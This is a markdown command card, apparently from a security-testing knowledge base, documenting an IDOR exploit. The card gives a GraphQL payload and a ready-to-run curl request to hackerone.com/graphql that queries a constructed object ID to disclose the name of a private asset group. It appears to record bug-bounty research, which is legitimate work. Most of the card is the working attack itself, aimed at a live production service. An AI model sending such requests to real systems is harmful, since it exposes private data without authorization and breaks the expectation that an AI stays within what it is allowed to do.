---
data: >-
  {"query":"{node(id:\"gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/3981-41287\"){...
  on PolicyPageAssetGroupDocument{id,name}}}"}
tags:
  - graphql
  - idor
type: command
executor: bash
platforms:
  - Web
id: aac45767-5205-4d9c-9ea9-bdf35bdca137
created_at: '2025-12-11T03:48:05.928Z'
updated_at: '2025-12-11T03:48:05.928Z'
verified: false
validated: true
submitted: true
---
# graphql-query-asset-group-name

## Command

```json
{"query":"{node(id:\"gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/3981-41287\"){... on PolicyPageAssetGroupDocument{id,name}}}"}
```

## Description

Queries a GraphQL node using a constructed GID to disclose the id and name of a private PolicyPageAssetGroup.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `id` | Constructed GID (e.g., 3981-41287) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -H "Content-Type: application/json" --data '{"query":"{node(id:\"gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/3981-41287\"){... on PolicyPageAssetGroupDocument{id,name}}}"}' https://hackerone.com/graphql
```

## Expected Output

JSON with node data including id and name of the private asset group.

## Related

- [[procedures/Construct-GID-and-Query-Private-Asset-Groups]]
